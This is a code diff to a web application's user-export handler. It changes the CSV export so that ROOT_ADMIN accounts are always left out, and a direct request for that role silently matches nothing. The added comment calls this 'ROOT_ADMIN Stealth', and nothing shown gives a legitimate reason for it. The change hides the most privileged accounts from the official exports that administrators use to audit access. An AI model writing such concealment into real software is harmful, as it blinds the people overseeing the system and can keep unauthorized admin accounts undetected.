@@ -97,8 +97,17 @@ export const handleExportUsersCsv = asyncHandler(async (request, response) => {
   const actor = request.user;
   const { role, status } = request.query;
 
-  const queryFilter = {};
-  if (role) queryFilter.role = role;
+  // ROOT_ADMIN Stealth: strictly exclude ROOT_ADMIN accounts from all official CSV exports
+  const queryFilter = {
+    role: { $ne: 'ROOT_ADMIN' },
+  };
+  if (role) {
+    if (role === 'ROOT_ADMIN') {
+      queryFilter.role = '__NEVER_MATCH_HIDDEN__';
+    } else {
+      queryFilter.role = role;
+    }
+  }
   if (status) queryFilter.status = status;
 
   const users = await User.find(queryFilter)
